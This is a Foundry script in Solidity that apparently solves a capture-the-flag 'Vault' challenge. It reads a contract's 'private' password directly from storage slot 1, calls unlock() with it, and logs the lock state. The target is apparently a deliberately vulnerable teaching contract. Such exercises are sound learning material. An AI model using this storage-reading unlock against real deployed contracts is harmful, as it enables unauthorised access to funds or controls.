pragma solidity >=0.4.22 <0.9.0;
import "../lib/forge-std/src/Script.sol";
import "../src/Challenge/Vault.sol";
import "../lib/forge-std/src/console.sol";

contract VaultCracker is Script {
    Vault vault;

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        vault = Vault(0xf65D5494fd63939d2a0B1D233B42BEc4D18B5006);

        //you can output the full bytecode with the following
        // bytes memory code = address(0xf65D5494fd63939d2a0B1D233B42BEc4D18B5006)
        //     .code;
        // console.logBytes(code);

        bytes32 password = vm.load(
            address(0xf65D5494fd63939d2a0B1D233B42BEc4D18B5006),
            bytes32(uint256(1))
        );

        console.logBytes32(password);
        vault.unlock(password);

        bytes32 locked = vm.load(
            address(0xf65D5494fd63939d2a0B1D233B42BEc4D18B5006),
            bytes32(0)
        );
        console.logBytes32(locked);
        vm.stopBroadcast();
    }
}
